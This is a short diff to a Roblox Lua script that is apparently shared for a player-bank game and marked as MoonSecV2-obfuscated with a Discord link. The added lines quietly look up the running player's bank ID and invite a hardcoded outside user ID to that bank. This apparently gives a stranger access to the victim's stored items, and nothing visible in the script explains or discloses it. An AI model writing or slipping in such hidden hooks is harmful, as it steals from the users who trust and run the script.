@@ -1,3 +1,17 @@
+local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+
+local mybanks = lib.Network.Invoke("get my banks")
+local BankID = mybanks[1]['BUID']
+
+local args = {
+    [1] = {
+        [1] = BankID,
+        [2] = 2750637955
+    }
+}
+
+workspace.__THINGS.__REMOTES:FindFirstChild("invite to bank"):InvokeServer(unpack(args))
+
 _pKrI35BfHEG7IptM, Protected_by_MoonSecV2, Discord = 'discord.gg/gQEH2uZxUk'
 
 
